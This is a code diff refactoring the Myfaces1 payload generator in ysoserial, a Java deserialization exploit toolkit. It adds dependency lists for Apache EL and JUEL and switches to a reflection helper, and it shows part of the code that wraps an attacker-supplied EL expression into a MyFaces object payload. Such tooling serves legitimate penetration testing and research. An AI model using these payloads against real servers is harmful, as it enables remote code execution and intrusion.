@@ -1,7 +1,6 @@
 package ysoserial.payloads;
 
 
-import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 
 import javax.el.ELContext;
@@ -20,6 +19,7 @@ import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
 
 
 /**
@@ -44,7 +44,7 @@ import ysoserial.payloads.util.PayloadRunner;
     "nls", "javadoc"
 } )
 @PayloadTest(skip="Requires running MyFaces, no direct execution")
-public class Myfaces1 implements ObjectPayload<Object> {
+public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
 
     /**
      * {@inheritDoc}
@@ -55,11 +55,37 @@ public class Myfaces1 implements ObjectPayload<Object> {
     public Object getObject ( String command ) throws Exception {
         return makeExpressionPayload(command);
     }
+    
+
+    public static String[] getDependencies () {
+        if ( System.getProperty("el") == null || "apache".equals(System.getProperty("el")) ) {
+            return new String[] {
+                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
+                "org.mortbay.jasper:apache-el:8.0.27",
+                "javax.servlet:javax.servlet-api:3.1.0",
+
+                // deps for mocking the FacesContext
+                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
+            };
+        } else if ( "juel".equals(System.getProperty("el")) ) {
+            return new String[] {
+                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
+                "de.odysseus.juel:juel-impl:2.2.7", "de.odysseus.juel:juel-api:2.2.7",
+                "javax.servlet:javax.servlet-api:3.1.0",
+
+                // deps for mocking the FacesContext
+                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
+            };
+        }
+
+        throw new IllegalArgumentException("Invalid el type " + System.getProperty("el"));
+    }
 
 
     /**
      * @param expr
      * @return
+     * @throws IllegalArgumentException 
      * @throws NoSuchFieldException
      * @throws IllegalAccessException
      * @throws Exception
@@ -68,15 +94,12 @@ public class Myfaces1 implements ObjectPayload<Object> {
      * @throws InstantiationException
      * @throws InvocationTargetException
      */
-    public static Object makeExpressionPayload ( String expr ) throws NoSuchFieldException, IllegalAccessException, Exception, ClassNotFoundException,
-            NoSuchMethodException, InstantiationException, InvocationTargetException {
+    public static Object makeExpressionPayload ( String expr ) throws IllegalArgumentException, IllegalAccessException, Exception  {
         FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
-        Field fEl = FacesContextImplBase.class.getDeclaredField("_elContext");
-        fEl.setAccessible(true);
         ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);
-        fEl.set(fc, elContext);
+        Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
         ExpressionFactory expressionFactory = ExpressionFactory.newInstance();
-
+        
         ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);
         ValueExpressionMethodExpression e = new ValueExpressionMethodExpression(ve1);
         ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class); //$NON-NLS-1$
